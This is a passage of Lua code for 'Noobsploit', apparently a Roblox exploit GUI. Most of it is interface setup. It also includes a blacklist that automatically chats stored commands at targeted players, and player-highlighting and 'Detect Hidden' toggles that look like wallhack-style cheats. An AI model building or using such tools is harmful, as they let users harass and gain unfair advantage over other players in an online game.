	btn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)

	btn.TextXAlignment = Enum.TextXAlignment.Center
	btn.Text = name
	btn.Name = name
	btn.MouseButton1Click:Connect(function()
		if tonumber(id) then
			box.Text = name
			local str = table.concat(uidata['blacklist'][tostring(id)], '\n')
			cmds.Text = str
			hide:Play()
			hide.Completed:Wait()
			drop.Parent.Visible = false
		end
	end)
	back.Close.MouseButton1Click:Connect(function()
		print('clicked')
		Confirmm.Visible = true
		local no
		local yes
		yes = Yes_2.MouseButton1Click:Connect(function()
			uidata['blacklist'][tostring(id)] = nil
			btn.Parent:Destroy()
			yes:Disconnect()
			Confirmm.Visible = false
			updatefile()
		end)
		no = No_2.MouseButton1Click:Connect(function()
			Confirmm.Visible = false
			no:Disconnect()
		end)
	end)
end
function addplrbtn(plr)
	local back = backg2:Clone()
	back.Parent = drop
	back.Name = plr.Name
	back.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
	guielements[#guielements+1] = back
	local btn = back.Button
	btn.Text = plr.Name
	btn.Name = plr.Name
	btn.TextScaled = true
	guielements[#guielements+1] = btn
	btn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
	btn.MouseButton1Down:Connect(function()
		box.Text = plr.Name
		box.TextTransparency = 0
		hide:Play()
		hide.Completed:Wait()
		drop.Parent.Visible = false
	end)
end
function addBlacklist(name, id)
	local cmd = cmds.Text:split('\n')
	uidata['blacklist'][tostring(id)] = cmd
end
add.MouseButton1Click:Connect(function()
	local name = box.Text
	local id
	pcall(function()
		id = plrs:GetUserIdFromNameAsync(box.Text)
	end)
	if tonumber(id) then
		addBlacklist(name, id)
		addblBtn(id, cmds.Text:split('\n'))
	end
	updatefile()
end)
function scan(plr)
	if uidata['blacklist'][tostring(plr.UserId)] then
		for i,v in pairs(uidata['blacklist'][tostring(plr.UserId)]) do
			plrs:Chat(v)
		end
	end
end


--Properties:

Noobsploit.Name = "Noobsploit"
Noobsploit.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Noobsploit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Topbar.Name = "Topbar"
Topbar.Parent = Noobsploit
guielements[#guielements+1] = Topbar
Topbar.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Topbar.Position = UDim2.new(0.247999996, 0, 0, 160)
Topbar.Size = UDim2.new(0, 200, 0, 20)

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = Topbar

TextLabel.Parent = Topbar
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Position = UDim2.new(0, 2, 0, 2)
TextLabel.Size = UDim2.new(1, -4, 1, -4)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Noobsploit"
guielements[#guielements+1] = TextLabel
TextLabel.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(98, 0, 0)
TextLabel.TextWrapped = true

UICorner_2.CornerRadius = UDim.new(0, 4)
UICorner_2.Parent = TextLabel

Close.Name = "Close"
Close.Parent = TextLabel
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1.000
Close.Position = UDim2.new(1, -22, 0, 0)
Close.Size = UDim2.new(0, 22, 1, 0)
Close.Font = Enum.Font.SourceSans
Close.Text = "-"
guielements[#guielements+1] = Close
Close.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextWrapped = true

Corner.Name = "Corner"
Corner.Parent = Topbar
guielements[#guielements+1] = Corner
Corner.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Corner.ClipsDescendants = true
Corner.Position = UDim2.new(0.5, -200, 1, -2)
Corner.Size = UDim2.new(2, 0, 0, 200)

Main.Name = "Main"
Main.Parent = Corner
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.ClipsDescendants = true
Main.Position = UDim2.new(0, 2, 0, 2)
Main.Size = UDim2.new(1, -4, 1, -4)
Main.ZIndex = 2

UICorner_3.Parent = Main

Container.Name = "Container"
Container.Parent = Main
Container.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Container.Position = UDim2.new(0, 0, 0.200000003, -10)
Container.Size = UDim2.new(1, 0, 0.800000012, 10)

UICorner_4.Parent = Container

ChatSettings.Name = "ChatSettings"
ChatSettings.Parent = Container
ChatSettings.Position = UDim2.new(0, 0, 0, 2)
ChatSettings.ScrollBarImageTransparency = 1
ChatSettings.CanvasSize = UDim2.new(1, 0, 1.1, 0)
ChatSettings.Active = true
ChatSettings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ChatSettings.BackgroundTransparency = 1.000
ChatSettings.ClipsDescendants = false
ChatSettings.Size = UDim2.new(1, 0, 1, 0)
ChatSettings.Visible = false

Options.Name = "Options"
Options.Parent = ChatSettings
guielements[#guielements+1] = Options
Options.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Options.BackgroundTransparency = 1.000
Options.ClipsDescendants = false
Options.Position = UDim2.new(0.0500000007, 0, 0, 0)
Options.Size = UDim2.new(0.899999976, 0, 0.95, 0)

UIGridLayout.Parent = Options
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 2, 0, 2)
UIGridLayout.CellSize = UDim2.new(1, 0, 0, 18)
UIGridLayout.FillDirectionMaxCells = 1

ColorPick.Name = "Color Pick"
ColorPick.Parent = Options
ColorPick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ColorPick.BackgroundTransparency = 1.000
ColorPick.Size = UDim2.new(0, 100, 0, 100)

TextLabel_2.Parent = ColorPick
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Highlight Color:"
guielements[#guielements+1] = TextLabel_2
TextLabel_2.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

BoxFrame.Name = "BoxFrame"
BoxFrame.Parent = ColorPick
guielements[#guielements+1] = BoxFrame
BoxFrame.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
BoxFrame.Position = UDim2.new(1, -100, 0, 0)
BoxFrame.Size = UDim2.new(0, 100, 1, 0)

UICorner_5.Parent = BoxFrame

TextBox.Parent = BoxFrame
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox.BorderSizePixel = 2
TextBox.Position = UDim2.new(0, 1, 0, 1)
TextBox.Size = UDim2.new(1, -2, 1, -2)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = uidata.highlightcolor.r..' '..uidata.highlightcolor.g..' '..uidata.highlightcolor.b or "R G B"
guielements[#guielements+1] = TextBox
TextBox.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
if TextBox.Text == 'R G B' then 
	TextBox.TextTransparency = 0.600
else
	TextBox.TextTransparency = 0
end
TextBox.TextWrapped = true
TextBox:GetPropertyChangedSignal('Text'):Connect(function(old)
	local split = TextBox.Text:split(' ')
	if #split ~= 3 then
		uidata.highlightcolor = {r = 255,g = 255,b = 255}
		return
	end
	local r = tonumber(split[1])
	local g = tonumber(split[2])
	local b = tonumber(split[3])
	if r and g and b then
		uidata.highlightcolor = {r = r,g = g,b = b}
	else
		uidata.highlightcolor = {r = 255,g = 255,b = 255}
	end
	updatefile()
end)

UICorner_6.CornerRadius = UDim.new(0, 3)
UICorner_6.Parent = TextBox

Dropdown.Name = "Dropdown"
Dropdown.Parent = TextBox
Dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Dropdown.BackgroundTransparency = 0.600
guielements[#guielements+1] = Dropdown
Dropdown.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Dropdown.ClipsDescendants = true
Dropdown.Position = UDim2.new(0.0500000007, 0, 1, 2)
Dropdown.Size = UDim2.new(0.899999976, 0, 0, 0)
local scrolly = Dropdown
scrolly.MouseEnter:Connect(function()
	local wheeldetect = ui.InputChanged:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseWheel) and scrolly.Visible and isHoveringOverObj(Corner) then
			if isHoveringOverObj(scrolly) then
				tween:Create(scrolly, scrollinfo, {CanvasPosition = Vector2.new(scrolly.CanvasPosition.X, scrolly.CanvasPosition.Y-(input.Position.Z*scrolly.AbsoluteSize.Y/3))}):Play()
			end
		end
	end)
end)

UIGridLayout_2.Parent = Dropdown
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellSize = UDim2.new(1, 0, 0, 15)

Option.Name = "Option"
Option.Parent = Options
Option.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option.BackgroundTransparency = 1.000
Option.Size = UDim2.new(0, 100, 0, 100)

TextLabel_3.Parent = Option
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Size = UDim2.new(1, 0, 1, 0)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Highlight Friends:"
guielements[#guielements+1] = TextLabel_3
TextLabel_3.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

Frame.Parent = Option
guielements[#guielements+1] = Frame

Frame.Name = 'BoolFrame'
Frame.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame.Position = UDim2.new(1, -100, 0, 0)
Frame.Size = UDim2.new(0, 100, 1, 0)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.Position = UDim2.new(0, 1, 0, 1)
TextButton.Size = UDim2.new(1, -2, 1, -2)
TextButton.ZIndex = 2
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Disabled"
guielements[#guielements+1] = TextButton
TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
boolbuttons['highlightfriends'] = TextButton


UICorner_7.Parent = TextButton

UICorner_8.Parent = Frame

Option2.Name = "Option2"
Option2.Parent = Options
Option2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option2.BackgroundTransparency = 1.000
Option2.Size = UDim2.new(0, 100, 0, 100)

TextLabel_4.Parent = Option2
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Size = UDim2.new(1, 0, 1, 0)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "Highlight  Self:"
guielements[#guielements+1] = TextLabel_4
TextLabel_4.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left

Frame_2.Parent = Option2
guielements[#guielements+1] = Frame_2
Frame_2.Name = 'BoolFrame'
Frame_2.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_2.Position = UDim2.new(1, -100, 0, 0)
Frame_2.Size = UDim2.new(0, 100, 1, 0)

TextButton_2.Parent = Frame_2
TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.Position = UDim2.new(0, 1, 0, 1)
TextButton_2.Size = UDim2.new(1, -2, 1, -2)
TextButton_2.ZIndex = 2
TextButton_2.Font = Enum.Font.SourceSans

guielements[#guielements+1] = TextButton_2
TextButton_2.Text = "Disabled"
TextButton_2.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
boolbuttons['highlightself'] = TextButton_2

UICorner_9.Parent = TextButton_2

UICorner_10.Parent = Frame_2

Option3.Name = "Option3"
Option3.ClipsDescendants = true
Option3.Parent = Options
Option3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3.BackgroundTransparency = 1.000
Option3.Size = UDim2.new(0, 100, 0, 100)

TextLabel_5.Parent = Option3
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Size = UDim2.new(1, 0, 1, 0)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Highlight Team:"
guielements[#guielements+1] = TextLabel_5
TextLabel_5.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

Frame_3.Parent = Option3
guielements[#guielements+1] = Frame_3
Frame_3.Name = 'BoolFrame'
Frame_3.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_3.Position = UDim2.new(1, -100, 0, 0)
Frame_3.Size = UDim2.new(0, 100, 1, 0)

TextButton_3.Parent = Frame_3
TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.Position = UDim2.new(0, 1, 0, 1)
TextButton_3.Size = UDim2.new(1, -2, 1, -2)
TextButton_3.ZIndex = 2
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Disabled"
guielements[#guielements+1] = TextButton_3
TextButton_3.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true
boolbuttons['highlightteam'] = TextButton_3

UICorner_11.Parent = TextButton_3

UICorner_12.Parent = Frame_3

Option3_2.Name = "Option3"
Option3_2.Parent = Options
Option3_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3_2.BackgroundTransparency = 1.000
Option3_2.Size = UDim2.new(0, 100, 0, 100)

TextLabel_6.Parent = Option3_2
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Size = UDim2.new(1, 0, 1, 0)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "Detect Hidden:"
guielements[#guielements+1] = TextLabel_6
TextLabel_6.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

Frame_4.Parent = Option3_2
guielements[#guielements+1] = Frame_4
Frame_4.Name = 'BoolFrame'
Frame_4.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_4.Position = UDim2.new(1, -100, 0, 0)
Frame_4.Size = UDim2.new(0, 100, 1, 0)

TextButton_4.Parent = Frame_4
TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.Position = UDim2.new(0, 1, 0, 1)
TextButton_4.Size = UDim2.new(1, -2, 1, -2)
TextButton_4.ZIndex = 2
TextButton_4.Font = Enum.Font.SourceSans
guielements[#guielements+1] = TextButton_4
TextButton_4.Text = "Disabled"
TextButton_4.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
boolbuttons['detecthidden'] = TextButton_4

UICorner_13.Parent = TextButton_4

TextLabel_7.Parent = TextButton_4
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.0500000007, 0, 1, 1)
TextLabel_7.Size = UDim2.new(0.899999976, 0, 0, 12)
TextLabel_7.Font = Enum.Font.SourceSans
TextLabel_7.Text = "!Performance Heavy!"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 226, 0)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

UICorner_14.Parent = Frame_4

Option3_3.Name = "Option3"
Option3_3.Parent = Options
Option3_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3_3.BackgroundTransparency = 1.000
Option3_3.Size = UDim2.new(0, 100, 0, 100)

Option3_4.Name = "Option3"
Option3_4.Parent = Options
Option3_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3_4.BackgroundTransparency = 1.000
Option3_4.Size = UDim2.new(0, 100, 0, 100)

TextLabel_8.Parent = Option3_4
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Size = UDim2.new(1, 0, 1, 0)
TextLabel_8.Font = Enum.Font.SourceSans
TextLabel_8.Text = "Highlight Player:"
guielements[#guielements+1] = TextLabel_8
TextLabel_8.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextWrapped = true
TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left

ButtonFrame.Name = "ButtonFrame"
ButtonFrame.Parent = Option3_4
guielements[#guielements+1] = ButtonFrame
ButtonFrame.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
ButtonFrame.Position = UDim2.new(0.5, -50, 1, 0)
ButtonFrame.Size = UDim2.new(0, 100, 1, 0)
function getplayer(str)
	for i,v in pairs(plrs:GetPlayers()) do if v.Name:lower():sub(1, str:len()) == str:lower() then return v end end
end
TextButton_5.Parent = ButtonFrame
TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.Position = UDim2.new(0, 1, 0, 1)
TextButton_5.Size = UDim2.new(1, -2, 1, -2)
TextButton_5.ZIndex = 2
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Disabled"
guielements[#guielements+1] = TextButton_5
TextButton_5.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
boolbuttons['highlightplayer'] = TextButton_5

UICorner_15.Parent = TextButton_5

UICorner_16.Parent = ButtonFrame

BoxFrame_2.Name = "BoxFrame"
BoxFrame_2.Parent = Option3_4
guielements[#guielements+1] = BoxFrame_2
BoxFrame_2.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
BoxFrame_2.Position = UDim2.new(1, -100, 0, 0)
BoxFrame_2.Size = UDim2.new(0, 100, 1, 0)

UICorner_17.Parent = BoxFrame_2

TextBox_2.Parent = BoxFrame_2
TextBox_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
guielements[#guielements+1] = TextBox_2
TextBox_2.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox_2.BorderSizePixel = 2
TextBox_2.Position = UDim2.new(0, 1, 0, 1)
TextBox_2.Size = UDim2.new(1, -2, 1, -2)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.Text = "Player"
TextBox_2.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox_2.TextScaled = true
TextBox_2.TextSize = 14.000
TextBox_2.TextTransparency = 0.600
TextBox_2.TextWrapped = true


UICorner_18.CornerRadius = UDim.new(0, 3)
UICorner_18.Parent = TextBox_2

Dropdown_2.Name = "Dropdown"
Dropdown_2.Parent = TextBox_2
Dropdown_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Dropdown_2.BackgroundTransparency = 0.600
Dropdown_2.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Dropdown_2.ClipsDescendants = true
Dropdown_2.Position = UDim2.new(0.0500000007, 0, 1, 2)
Dropdown_2.Size = UDim2.new(0.899999976, 0, 0, 0)

UIGridLayout_3.Parent = Dropdown_2
UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_3.CellSize = UDim2.new(1, 0, 0, 15)

Logs.Name = "Logs"
Logs.Parent = Container
Logs.Active = true
Logs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Logs.BackgroundTransparency = 1.000
Logs.Size = UDim2.new(1, 0, 1, 0)
Logs.Visible = false

-- Gui to Lua
-- Version: 3.2

-- Instances:

List.Name = "List"
List.Parent = Logs
List.Active = true
List.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
List.BackgroundTransparency = 1
List.BorderSizePixel = 0
List.Size = UDim2.new(1, 0, 1, 0)
List.ScrollingEnabled = true
List.ScrollingDirection = Enum.ScrollingDirection.Y
List.ScrollBarImageTransparency = 0
guielements[#guielements+1] = List
List.ScrollBarImageColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
List.CanvasSize = UDim2.new(0, 0, 0, 0)
List.ScrollBarThickness = 8


--[[
local Frame2 = Instance.new("Frame")
local UICorner2 = Instance.new("UICorner")
local Frame_22 = Instance.new("Frame")
local UICorner_22 = Instance.new("UICorner")
local Dot1 = Instance.new("Frame")
local Dot2 = Instance.new("Frame")
local Dot3 = Instance.new("Frame")

--Properties:

Frame2.Parent = Logs
Frame2.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame2.Size = UDim2.new(0, 100, 0, 100)

UICorner2.Parent = Frame2

Frame_22.Parent = Frame2
Frame_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_22.Position = UDim2.new(0, 1, 0, 1)
Frame_22.Size = UDim2.new(1, -2, 1, -2)
Frame_22.BorderSizePixel = 0

UICorner_22.Parent = Frame_22

Dot1.Name = "Dot1"
Dot1.Parent = Frame_22
Dot1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Dot1.Position = UDim2.new(0.025, 0, 0.25, 0)
Dot1.Size = UDim2.new(0.85, 0, 0, 1)

Dot2.Name = "Dot2"
Dot2.Parent = Frame_22
Dot2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Dot2.Position = UDim2.new(0.025, 0, 0.5, 0)
Dot2.Size = UDim2.new(0.85, 0, 0, 1)

Dot3.Name = "Dot3"
Dot3.Parent = Frame_22
Dot3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Dot3.Position = UDim2.new(0.025, 0, 0.75, 0)
Dot3.Size = UDim2.new(0.85, 0, 0, 1)

-- Scripts:

local function NUIRT_fake_script() -- Frame_2.script 
	local script = Instance.new('LocalScript', Frame_22)

	local bar = script.Parent.Parent
	local rs = game:GetService'RunService'
	local ui = game:GetService('UserInputService')
	local scrollinfo = TweenInfo.new(.3)
	local tween = game:GetService('TweenService')
	local scrolly = List
	local m = game:GetService('Players').LocalPlayer:GetMouse()
	function isHoveringOverObj(obj)
		local tx = obj.AbsolutePosition.X
		local ty = obj.AbsolutePosition.Y
		local bx = tx + obj.AbsoluteSize.X
		local by = ty + obj.AbsoluteSize.Y
		if m.X >= tx and m.Y >= ty and m.X <= bx and m.Y <= by then
			return true
		end
	end
	scrolly.Changed:Connect(function()
		local size = (scrolly.CanvasSize.Y.Offset/scrolly.AbsoluteSize.Y)
        local yy = math.min(scrolly.AbsoluteSize.Y/size-6, scrolly.AbsoluteSize.Y-5)
        local y = math.max(yy, 23)
		bar.Size = UDim2.new(0, 8, 0, y)
		tween:Create(bar, TweenInfo.new(.05), {Position = UDim2.new(1, -8, 0, scrolly.CanvasPosition.Y/size, scrolly.AbsoluteSize.Y-bar.AbsoluteSize.Y)}):Play()
	end)


    
    local dragging = false
	local function beginSelection()
        dragging = true
		repeat game:GetService'RunService'.Heartbeat:Wait()
			local minXPos = bar.AbsolutePosition.Y
			local maxXPos = minXPos+bar.AbsoluteSize.Y
			local xPixelSize = maxXPos-minXPos
			local mouseX = ui:GetMouseLocation().Y
			if mouseX<minXPos then
				mouseX = minXPos
			elseif mouseX>maxXPos then
				mouseX = maxXPos
			end
			local xPos = (mouseX-minXPos)/xPixelSize
			bar.Position = UDim2.new(1, -8, 0, xPos)
		until not dragging
        dragging = false
	end
	function endSelection()
		dragging = false
	end
	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			beginSelection()
		end
	end
	bar.InputBegan:Connect(inputBegan)
    local function inputEnded(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
            print('LEFT IT')
        end
    end
	bar.InputEnded:Connect(inputEnded)
end
coroutine.wrap(NUIRT_fake_script)()
]]

Commands.Name = "Commands"
Commands.Parent = Container
Commands.Active = true
Commands.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Commands.BackgroundTransparency = 1.000
Commands.Size = UDim2.new(1, 0, 1, 0)
Commands.Visible = false

CmdList.Name = "CmdList"
CmdList.Parent = Commands
CmdList.Active = true
CmdList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CmdList.BackgroundTransparency = 1.000
CmdList.BorderSizePixel = 0
guielements['cmdlist'] = CmdList
CmdList.ScrollingDirection = Enum.ScrollingDirection.Y
CmdList.Size = UDim2.new(1, 0, 1, 0)
CmdList.CanvasSize = UDim2.new(0, 0, 0, 0)
CmdList.ScrollBarThickness = 8
CmdList.ScrollBarImageColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)

General.Name = "General"
General.Parent = Container
General.Active = true
guielements['general'] = General
General.BorderSizePixel = 0
General.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
General.BackgroundTransparency = 1.000
General.Size = UDim2.new(1, 0, 1, 0)
General.Visible = false
General.ScrollingDirection = Enum.ScrollingDirection.Y
General.ScrollBarThickness = 8
General.ScrollBarImageColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)

GnACont.Name = "GnA"
GnACont.Parent = Container
GnACont.Active = true
guielements['gear'] = GnACont
GnACont.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GnACont.BackgroundTransparency = 1.000
GnACont.Size = UDim2.new(1, 0, 1, 0)
GnACont.Visible = false


Settings.Name = "Settings"
Settings.Parent = Container
Settings.Position = UDim2.new(0, 0, 0, 2)
Settings.Active = true
Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Settings.BackgroundTransparency = 1.000
Settings.Size = UDim2.new(1, 0, 1, 0)

Options_2.Name = "Options"
Options_2.Parent = Settings
guielements[#guielements+1] = Options_2
Options_2.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Options_2.BackgroundTransparency = 1.000
Options_2.Position = UDim2.new(0.0500000007, 0, 0, 0)
Options_2.ClipsDescendants = false
Options_2.Size = UDim2.new(0.899999976, 0, 0.95, 0)

UIGridLayout_4.Parent = Options_2
UIGridLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_4.CellPadding = UDim2.new(0, 2, 0, 2)
UIGridLayout_4.CellSize = UDim2.new(1, 0, 0, 18)
UIGridLayout_4.FillDirectionMaxCells = 1

PrefixFrame.Name = "PrefixFrame"
PrefixFrame.Parent = Options_2
PrefixFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PrefixFrame.BackgroundTransparency = 1.000
PrefixFrame.Size = UDim2.new(0, 100, 0, 100)

TextLabel_9.Parent = PrefixFrame
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Size = UDim2.new(1, 0, 1, 0)
TextLabel_9.Font = Enum.Font.SourceSans
TextLabel_9.Text = "Prefix:"
guielements[#guielements+1] = TextLabel_9
